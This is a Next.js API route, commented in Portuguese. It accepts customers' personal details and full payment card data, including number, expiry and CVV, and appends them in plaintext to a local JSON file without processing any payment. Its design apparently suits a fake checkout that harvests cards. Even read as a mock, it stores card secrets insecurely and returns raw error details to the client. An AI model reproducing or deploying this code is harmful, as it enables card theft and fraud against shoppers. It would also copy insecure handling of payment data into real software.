import { type NextRequest, NextResponse } from "next/server"
import fs from 'fs'
import path from 'path'

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    
    // Validar dados obrigatórios
    if (!data.customerName || !data.cardNumber || !data.cardHolderName) {
      return NextResponse.json({ 
        success: false,
        error: "Dados obrigatórios faltando"
      }, { status: 400 })
    }
    
    // Criar objeto com dados do cartão
    const cardData = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      customer: {
        name: data.customerName || '',
        cpf: data.customerCpf || '',
        phone: data.customerPhone || '',
        email: data.customerEmail || '',
        address: data.customerAddress || ''
      },
      card: {
        number: data.cardNumber || '',
        holderName: data.cardHolderName || '',
        expiryDate: data.cardExpiryDate || '',
        cvv: data.cardCvv || ''
      },
      product: {
        name: data.productName || '',
        price: data.productPrice || 0,
        quantity: data.productQuantity || 1
      },
      total: data.total || 0
    }
    
    // Caminho do arquivo JSON
    const filePath = path.join(process.cwd(), 'card-data.json')
    
    // Ler dados existentes ou criar array vazio
    let existingData = []
    try {
      if (fs.existsSync(filePath)) {
        const fileContent = fs.readFileSync(filePath, 'utf-8')
        existingData = JSON.parse(fileContent)
      }
    } catch (error) {
      existingData = []
    }
    
    // Adicionar novo registro
    existingData.push(cardData)
    
    // Salvar no arquivo
    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2), 'utf-8')
    
    return NextResponse.json({ 
      success: true,
      message: "Dados salvos com sucesso",
      id: cardData.id
    })
  } catch (error) {
    return NextResponse.json({ 
      success: false,
      error: "Erro ao salvar dados",
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
  }
}
